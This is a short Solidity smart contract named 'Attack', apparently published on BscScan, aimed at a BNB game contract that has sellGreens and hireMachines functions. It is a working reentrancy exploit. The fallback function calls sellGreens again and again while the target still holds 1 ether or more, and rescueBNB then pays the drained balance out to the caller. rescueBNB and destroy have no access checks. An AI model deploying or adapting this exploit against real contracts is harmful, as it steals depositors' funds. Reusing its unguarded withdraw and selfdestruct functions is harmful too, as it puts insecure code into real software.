/**
 *Submitted for verification at BscScan.com on 2023-01-04
*/

pragma solidity ^0.8.17;

interface victim {

    function sellGreens() external;
    function hireMachines(address ref) external payable;
}

contract Attack {
    victim public v;

    constructor(address addr) {
        v = victim(addr);
    }

    fallback() external payable {

        if (address(v).balance >= 1 ether) {
            v.sellGreens();
        }
    }//0x3c695DB148DeC222a9f7B5bd960fc5AbA9637aCa

    function attack() external payable {
        v.sellGreens();
    }

    function buy() external payable {
        v.hireMachines{value: 100000000000000}(address(0x0000000000000000000000000000000000000000));
    }

    function rescueBNB() external {
        payable(msg.sender).transfer(address(this).balance);
    }

    function destroy(address addr) public {
        selfdestruct(payable(addr));
    }

}